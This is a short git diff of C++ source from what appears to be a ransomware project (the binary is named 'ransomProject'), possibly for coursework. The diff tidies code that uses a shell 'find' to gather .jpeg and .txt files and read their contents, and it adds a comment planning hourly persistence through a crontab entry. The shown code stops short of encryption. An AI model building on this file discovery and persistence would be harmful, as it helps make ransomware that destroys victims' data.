@@ -58,10 +58,9 @@ int main(){
 	// ------------------
 
 	//PART ONE --- FIND FILES --- TOOOODOOOOOO - Expand Big Time
-	system("find . -type f \\( -name \"*.jpeg\" -o -name \"*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.									      
-	bool result = getFileContents("fileLocations", fileLocationsVector);					  // Read file locations into a string vector.
-
-	if(result){		
+	system("find . -type f \\( -name \"*.jpeg\" -o -name \"*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.	
+	
+	if(getFileContents("fileLocations", fileLocationsVector)){		 // Read file locations into a string vector.
 		for(string& location : fileLocationsVector){
 			if(getFileContents(location, temporaryVector)){
 				fileContentVector.push_back(temporaryVector);
@@ -107,7 +106,8 @@ int main(){
     //Send list of files to Python.
 
 
-    //PART FOUR --- DEPLOY/PERSISTENCE
+    //PART FOUR --- PERSISTENCE
+    //Using crontab (1 * * * * cd /home/chronks/Desktop/IRProject && ./ransomProject)
 
 	
     return 0;
